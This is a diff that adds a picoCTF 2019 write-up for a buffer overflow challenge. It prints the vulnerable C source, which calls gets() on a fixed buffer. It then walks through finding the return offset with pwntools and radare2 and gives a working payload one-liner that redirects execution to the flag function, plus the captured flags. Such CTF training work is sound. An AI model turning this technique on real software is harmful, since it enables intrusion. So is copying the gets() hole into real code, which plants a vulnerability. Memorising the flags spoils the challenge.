@@ -99,3 +99,99 @@ picoCTF{3asY_P3a5y1fcf81f9}
 ```
 Flag:```picoCTF{3asY_P3a5y1fcf81f9}```
 <br>
+<center><h2>Overflow 2 [150]</h2></center>
+<br>
+Q: You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this *[program](/picoctf2019/files/overflow1Vuln)*? You can find it in /problems/overflow-1_0_48b13c56d349b367a4d45d7d1aa31780 on the shell server. *[Source](/picoctf2019/files/overflow0Vuln.c)*.
+
+A: So this problem required a little bit more work. So the question tells us that we have to change the return address to the flag function. Taking a look at the source code we do indeed see a flag function that reeds the ```flag.txt``` file.
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include "asm.h"
+
+#define BUFFSIZE 64
+#define FLAGSIZE 64
+
+void flag() {
+  char buf[FLAGSIZE];
+  FILE *f = fopen("flag.txt","r");
+  if (f == NULL) {
+    printf("Flag File is Missing. please contact an Admin if you are running this on the shell server.\n");
+    exit(0);
+  }
+
+  fgets(buf,FLAGSIZE,f);
+  printf(buf);
+}
+
+void vuln(){
+  char buf[BUFFSIZE];
+  gets(buf);
+
+  printf("Woah, were jumping to 0x%x !\n", get_return_address());
+}
+
+int main(int argc, char **argv){
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+  puts("Give me a string and lets see what happens: ");
+  vuln();
+  return 0;
+}
+```
+Now first step is to find the offset of the binary. This is kind of like the place in line where the program runs out of memory. There are a few ways to do this but I will use pwntools.
+
+First I generate a random string of characters.
+```
+>>> from pwn import *
+>>> cyclic(100)
+'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
+```
+Second, I execute the binary and input the random string of characters
+```
+# ./vuln
+Give me a string and lets see what happens:
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+Woah, were jumping to 0x61616174 !
+Segmentation fault
+```
+Lastly, I will use pwntools again to get the the exact location of the offset. in this case it is 76
+```
+>>> from pwn import *
+>>> cyclic_find(p32(0x61616174))
+76
+```
+Next we need to grab the memory address of the ```flag``` function. This can be done using ```Radare2```.
+```
+# r2 vuln
+[0x080484d0]> aaaa
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Analyze function calls (aac)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
+[x] Enable constraint types analysis for variables
+[0x080484d0]> afl
+    ...
+    ...
+0x080485e6    3 121          sym.flag
+    ...
+    ...
+[0x080484d0]> q
+```
+Now we have all we need to get the flag. On the shell server, navigate to ```/problems/overflow-1_0_48b13c56d349b367a4d45d7d1aa31780```.
+
+To create our payload we of course are going to use pwntools. First we are going to take ```A``` and multiply it by our offset of ```76``` to fill up the buffer space. Next we are going to add the address of our flag function. We can't just add it like ```0x080485e6``` or ```\x08\x04\x65\xe6``` because it would throw an error since its not in the correct format. We need to put it in Little Endian format which is basically reversing it. ```\xe6\x85\x04\x08```. Now if we put everything together, we get a command like the one below and when executed, we get the flag.
+```
+$ python -c "from pwn import *; print 'A' * 76 + '\xe6\x85\x04\x08'" | ./vuln
+Give me a string and lets see what happens:
+Woah, were jumping to 0x80485e6 !
+picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5c0178710}
+Segmentation fault (core dumped)
+```
+Flag:```picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5c0178710}```
+<br>  
